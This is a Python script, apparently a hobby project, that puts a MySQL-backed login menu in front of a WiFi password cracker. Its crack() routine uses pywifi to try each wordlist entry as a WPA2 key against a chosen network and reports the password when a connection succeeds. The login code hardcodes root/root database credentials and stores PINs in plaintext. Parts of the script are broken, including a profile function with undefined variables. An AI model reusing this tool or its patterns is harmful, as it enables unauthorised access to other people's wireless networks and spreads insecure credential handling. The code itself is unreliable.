import mysql.connector	
from mysql.connector import Error
import pandas as pd
import getpass
import os
import argparse
import sys
import os.path
import platform
import re
import time
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile



dbms = mysql.connector.connect(
								host= 'localhost', 
								user= 'root', 
								passwd= 'root', 
								database= 'credentials'
								)
#Here, you must change the required fields according to your credentials set for mySQL

curs = dbms.cursor() #point at operators in mysql


def menu():
	os.system('cls')
	print('''		
		                  
			1) log in		
			2) sign up	
			3) help		    
			4) exit			
							
		''')
	opt = int(input("enter your choice in digits: "))
	if opt == 1:
		login()
	elif opt == 2:
		signup()
	elif opt == 3:
		help()
	elif opt == 4:
		exit()
	else:
		print("Why are you joking?")

#startup UI

def login():
	os.system('cls')
	ii = input("enter your User ID: ")
	curs.execute("SELECT ID FROM users")  #shows ID row of users table
	rows = curs.fetchall()  #fetch all data of ID row

	if (ii,) in rows:  #if value of ii is in the row, condition evaluates
		ps = getpass.getpass("enter your pin: ")
		curs.execute("SELECT pin FROM users WHERE ID = %s", (ii,))    #shows PIN row of users table
		row = curs.fetchall()   #fetch all data of pin row
		
		if (ps,) in row:    #if data in row matches with data in ps, condition evaluates
			main()
		else:
			input("Invalid password, try again...")
			login()
	else:
		input("No such userID found in our records...")
		login()
		

def exit():
	os.system('cls')
	print("I think, you need time. Bye!")
	input("press enter...")


def signup():
	os.system('cls')
	nme = input("enter your name: ")
	usid = input("enter your userID: ")
	curs.execute("SELECT ID FROM users")
	rows = curs.fetchall()

	if (usid,) in rows:
		print("This userID is already taken. please select a different one.")
		input("press enter to try again...")
		signup()
	else:
		pasd = getpass.getpass("please enter a pin in digits, characters are not supported: ")
		entry = """insert into users (name, ID, pin) values(%s, %s, %s)"""
		data = (nme, usid, pasd)
		curs.execute(entry, data)
		dbms.commit()
		menu()


def main():
	os.system('cls')
	print('''

			1) start
			2) setting
			3) help
			4) exit

			''')
	optt = int(input("enter the options in digits: "))
	
	if optt == 1:
		crack()
	elif optt == 2:
		setting()
	elif optt == 3:
		helpp()
	elif optt == 4:
		exit()
	else:
		input("no such option...")
		exit()


def helpp():
	os.system('cls')
	print('''
			1) choose option one.
			2) create a .txt file with any name you want, but keep it in the same directory where this application is located.
			3) write up all the password combinations you want to try for the wifi.
			4) if you are not sure of combinations, just google some combinations and paste them here.
			5) now, in console write the ssid of your network. ssid is nothing but the name of wifi.
			6) enter the name of txt file you created in this format - (name.txt)
			7) now hit enter and the programme will try all the password combinations listed in that file.
			8) auto generation of password combination will come soon.

			''')
	input("press enter to return back to main menu...")
	main()


def setting():
	os.system('cls')
	print('''

			1) My profile
			2) change ID
			3) change password
			4) delete ID
			5) exit

			''')
	stt = int(input("enter the option in digits: "))

	if stt == 1:
		prof()
	elif stt == 2:
		chnid()
	elif stt == 3:
		chpss()
	elif stt == 4:
		delid()
	elif stt == 5:
		exit()


def prof():
		os.system()
		print("User profile-")
		print("your userID - "+ss)
		nem = curs.execute(""" SELECT name FROM users WHERE ID = %s""", (id_))
		print("Your name - "+nem)


def chnid():
	os.system('cls')
	idn = input ("enter your new ID: ")
	idd = input("enter your current ID: ")
	newid = """UPDATE USERS SET ID = %s WHERE ID = %s """
	nyy = (idn, idd)
	curs.execute(newid, nyy)


def help():
	os.system('cls')
	print('''
			1) If you are already an user, enter 1 
			2) In the next window, enter your credentials.

			3) If you are a new user, enter 2  
			4) Hit enter and in the next window, do as directed.
			
			''')
	input('press enter to go back...')
	menu()
	

def crack():
	RED   = "\033[1;31m"  
	BLUE  = "\033[1;34m"
	CYAN  = "\033[1;36m"
	GREEN = "\033[0;32m"
	RESET = "\033[0;0m"
	BOLD    = "\033[;1m"
	REVERSE = "\033[;7m"

	try:
		# wlan
		wifi = PyWiFi()
		ifaces = wifi.interfaces()[0]

		ifaces.scan() #check the card
		results = ifaces.scan_results()


		wifi = pywifi.PyWiFi()
		iface = wifi.interfaces()[0]
	except:
		print("[-] Error system")

	type = False

	def main(ssid, password, number):

		profile = Profile() 
		profile.ssid = ssid
		profile.auth = const.AUTH_ALG_OPEN
		profile.akm.append(const.AKM_TYPE_WPA2PSK)
		profile.cipher = const.CIPHER_TYPE_CCMP


		profile.key = password
		#iface.remove_all_network_profiles()
		tmp_profile = iface.add_network_profile(profile)
		time.sleep(0.1) # if script not working change time to 1 !!!!!!
		iface.connect(tmp_profile) # trying to Connect
		time.sleep(0.3) # 1s

		if ifaces.status() == const.IFACE_CONNECTED: # checker
			time.sleep(1)
			print(BOLD, GREEN,'[*] Crack success!',RESET)
			print(BOLD, GREEN,'[*] password is ' + password, RESET)
			input()
			exit()
		else:
			print(RED, '[{}] denied {}'.format(number, password))

	def pwd(ssid, file):
		number = 0
		with open(file, 'r', encoding='utf8') as words:
			for line in words:
				number += 1
				line = line.split("\n")
				pwd = line[0]
				main(ssid, pwd, number)
						


	def menu():
		parser = argparse.ArgumentParser(description='argparse Example')

		parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
		parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

		group1 = parser.add_mutually_exclusive_group()

		group1.add_argument('-v', '--version', metavar='', help='version')
		print(" ")

		args = parser.parse_args()

		print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
		time.sleep(2.5)

		if args.wordlist and args.ssid:
			ssid = args.ssid
			filee = args.wordlist
		elif args.version:
			exit()
		else:
			print(BLUE)
			ssid = input("[*] SSID: ")
			filee = input("[*] pwds file: : ")


		# thx
		if os.path.exists(filee):
			if platform.system().startswith("Win" or "win"):
				os.system("cls")
			else:
				os.system("clear")

			print(BLUE,"[~] Cracking...")
			pwd(ssid, filee)

		else:
			print(RED,"[-] No Such File.",BLUE)


	if __name__ == "__main__":
		menu()



menu()

